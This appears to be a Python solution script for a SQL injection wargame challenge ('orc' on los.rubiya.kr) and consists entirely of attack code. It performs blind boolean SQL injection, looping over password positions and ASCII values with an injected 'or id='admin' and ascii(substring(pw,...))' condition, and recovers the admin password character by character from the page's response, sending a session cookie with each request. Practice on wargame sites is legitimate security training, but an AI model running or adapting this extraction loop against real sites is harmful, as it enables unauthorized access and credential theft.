# -*- coding: utf-8 -*-
import urllib.request

answer = ""
user_agent = "MMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

for i in range(1, 9):
    try:
        for j in range(33, 128):
            url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=a%27+or+id%3d%27admin%27+and+ascii(substring(pw,'
            url = url + str(i) + ',1))=' + str(j) + '--+'

            print(url)

            req = urllib.request.Request(url);
            req.add_header('User-agent', user_agent)
            req.add_header("Cookie", "PHPSESSID=res07ef6n87pg7clg2q6hfi3cd")

            res = urllib.request.urlopen(req)
            data = res.read().decode('utf-8')

            if data.find('<h2>Hello admin</h2>') != -1:
                print(chr(j))
                answer = answer + chr(j)
                break
    except Exception as e:
        continue

print(answer)
